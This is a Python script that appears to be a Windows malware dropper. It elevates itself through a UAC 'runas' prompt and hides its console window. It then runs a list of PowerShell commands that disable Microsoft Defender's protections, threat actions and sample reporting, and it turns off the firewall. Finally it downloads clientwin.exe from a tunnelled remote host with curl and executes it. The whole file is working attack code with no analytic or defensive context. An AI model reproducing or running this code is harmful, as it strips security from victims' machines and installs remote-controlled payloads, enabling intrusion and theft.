import os
import ctypes    
import enum      
import sys       
import socket    
import os        
import subprocess
from tun import tunnel
# Reference:
# msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx


class SW(enum.IntEnum):
    SHOWNORMAL = 1


class ERROR(enum.IntEnum):

    ZERO = 0
    FILE_NOT_FOUND = 2
    PATH_NOT_FOUND = 3
    BAD_FORMAT = 11
    ACCESS_DENIED = 5
    ASSOC_INCOMPLETE = 27
    DDE_BUSY = 30
    DDE_FAIL = 29
    DDE_TIMEOUT = 28
    DLL_NOT_FOUND = 32
    NO_ASSOC = 31
    OOM = 8
    SHARE = 26


def bootstrap():
    if ctypes.windll.shell32.IsUserAnAdmin():
        hide()
        main()
    else:
        hinstance = ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
        )
        if hinstance <= 32:
            raise RuntimeError(ERROR(hinstance))


def main():
    cmds = ['powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"','powershell.exe -command "Set-MpPreference -PUAProtection disable"','powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"','powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"', 'powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"','powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"','powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"', 'powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"','powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"','powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"','powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"','powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"','powershell.exe -command "Set-MpPreference -MAPSReporting 0"','powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"','powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"','powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"','powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"','powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"','powershell.exe -command "netsh advfirewall set allprofiles state off"']
    for i in cmds:
        os.system(i)
    os.system(f'curl -o {tunnel}/files/clientwin.exe')
    os.system('clientwin.exe')
    
def hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)


if __name__ == '__main__':
    bootstrap()